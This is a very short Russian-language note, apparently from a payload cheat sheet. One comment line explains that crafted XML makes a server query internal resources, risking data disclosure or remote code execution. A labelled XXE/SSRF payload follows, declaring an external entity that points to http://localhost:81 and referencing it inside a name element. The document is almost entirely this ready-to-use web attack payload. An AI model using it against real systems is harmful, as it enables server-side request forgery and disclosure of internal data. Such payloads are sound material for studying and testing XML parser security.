# Манипулируя XML данными, заставляем сервер выполнить запросы к внутренним ресурсам, что может привести к раскрытию конфиденциальной информации или даже к удаленному выполнению кода.

# Payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY resp SYSTEM "http://localhost:81">
]>
<name>&resp;</name>